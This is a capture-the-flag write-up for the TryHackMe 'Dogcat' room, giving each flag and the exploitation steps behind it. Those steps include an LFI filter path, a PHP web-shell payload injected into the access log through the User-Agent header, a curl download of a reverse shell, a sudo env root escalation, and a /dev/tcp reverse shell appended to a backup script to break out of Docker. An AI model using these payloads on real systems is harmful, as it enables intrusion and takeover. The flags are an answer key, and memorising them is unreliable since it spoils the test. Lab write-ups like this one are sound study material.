# DOGCAT

> - **What is flag 1?**
>> THM{Th1s_1s_N0t_4_Catdog_ab67edfa}

Vulnerable to LFI with php LFI. Navigate to `http://10.10.252.71/?view=php://filter/convert.base64-encode/resource=dog/../flag` then base64 decode the text.

> - **What is flag 2?**
>> THM{LF1_t0_RC3_aec3fb}

Accessing to `/var/log/apache2/access.log` show that it includes our user agent. We can  forge our user agent and use it as a RCE. Using `curl http://$IP -H "User-agent : <?php system(\$_GET['c']); ?> "` to inject our backdoor into it. Then we can execute command just by navigating to `http://$IP/?view=dog/../../../../../var/log/apache2/access.log&ext=&c=<command here>`\
Running `curl -h` shows that we have curl installed. So we set up a server on our host machine. Then using `curl -o shell.php http://<host ip>:<host port>/<rev shell filename>` on the remote machine to upload a php reverse shell onto the machine.Set up a listener on host machine then navigate to `http://$IP/?view=dog/../shell`

> - **What is flag 3?**
>> THM{D1ff3r3nt_3nv1ronments_874112}

Running `sudo -l` shows we can run `env` as sudo. Just simply run `sudo env /bin/bash` will gives us root access.

> - **What is flag 4?**
>> THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}

Further enumerating we found that there is a .docker on the machine. Meaning we are in a docker environment. Breaking out of it should gives us last flag. Exploring around we found a backups in /opt. Inside has a backup.sh file. This should be the file that is run by the outside to backup the docker. `echo "bash -i >& /dev/tcp/10.11.7.208/9002 0>&1" >> backup.sh` adds a new command into backup.sh so when it is run we can get a reverse shell. Now just set up a listener on our host machine and wait for a minute.
